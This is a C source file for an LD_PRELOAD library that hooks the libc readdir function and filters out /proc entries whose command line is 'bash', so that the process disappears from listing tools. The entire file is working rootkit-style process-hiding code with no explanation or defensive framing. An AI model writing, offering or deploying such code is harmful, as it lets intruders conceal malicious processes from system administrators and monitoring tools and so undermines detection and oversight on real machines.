#include <dirent.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <gnu/lib-names.h>


#define BUFFER_SIZE 1024
#define PROCESS_NAME "bash"


static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;

static void get_proc_command(const char *pid, char* name, size_t size);

struct dirent *readdir(DIR * dirp) {
    /* Hook original function on first call */
    static int called = 0;
    if (!called) {
        void *clib_handle;
        clib_handle = dlopen(LIBC_SO, RTLD_LAZY);
        if (!clib_handle) {
            fprintf(stderr, "%s\n", dlerror());
            exit(EXIT_FAILURE);
        }
        dlerror();

        orig_readdir = (struct dirent *(*)(DIR*)) dlsym(clib_handle, "readdir");
        if (!orig_readdir) {
            fprintf(stderr, "%s\n", dlerror());
            exit(EXIT_FAILURE);
        }
        dlerror();

        called = 1;
    }
    
    struct dirent *given_dirent;

    int is_blocked;
    do {
        is_blocked = 0;
        given_dirent = orig_readdir(dirp);
        if (given_dirent == NULL) {
            return NULL;
        }

        char process_name[BUFFER_SIZE];
        get_proc_command(given_dirent->d_name, process_name, BUFFER_SIZE);
        if (strcmp(process_name, PROCESS_NAME) == 0) {
            is_blocked = 1;
        }
    } while(is_blocked);

    return given_dirent;
}

static void get_proc_command(const char *pid, char* name, size_t size) {
    char filepath[BUFFER_SIZE];
    sprintf(filepath, "/proc/%s/cmdline", pid);
    FILE *file = fopen(filepath, "r");
    if (!file) {
        name[0] = '\0';
        return;
    }
    int i = 0;
    while (i < size - 1 && fscanf(file, "%c", name + i++) != EOF);
    name[i] = '\0';
    fclose(file);
}
